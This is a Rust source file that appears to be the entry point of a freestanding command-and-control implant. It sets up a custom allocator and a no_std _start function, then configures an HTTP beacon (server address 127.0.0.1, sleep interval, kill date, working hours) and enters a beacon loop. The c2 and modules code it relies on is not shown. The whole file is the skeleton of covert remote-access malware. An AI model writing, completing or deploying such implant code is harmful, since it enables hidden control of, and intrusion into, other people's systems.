#![cfg_attr(not(test), no_std)]
#![cfg_attr(not(test), no_main)]
#![allow(clippy::missing_safety_doc)]
#![allow(clippy::result_unit_err)]
#![allow(clippy::new_without_default)]
#![allow(clippy::empty_loop)]
#![allow(clippy::manual_range_contains)]
#![allow(clippy::ptr_eq)]
#![allow(clippy::unnecessary_cast)]
#![allow(clippy::needless_range_loop)]
#![allow(clippy::collapsible_if)]

#[cfg(test)]
extern crate std;

extern crate alloc;

pub mod utils;
pub mod c2;
pub mod modules;

// Global Allocator
#[global_allocator]
static ALLOCATOR: utils::heap::MiniHeap = utils::heap::MiniHeap::new(0x10000000, 1024 * 1024);

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[cfg(not(test))]
#[no_mangle]
pub extern "C" fn _start() -> ! {
    // 1. Initialize
    // utils::api_resolver::init();

    let config = c2::C2Config {
        transport: c2::TransportType::Http,
        server_addr: "127.0.0.1",
        sleep_interval: 5000,
        kill_date: 0,
        working_hours: (0, 0),
    };

    // 2. Enter C2 Loop
    c2::run_beacon_loop(config);
}
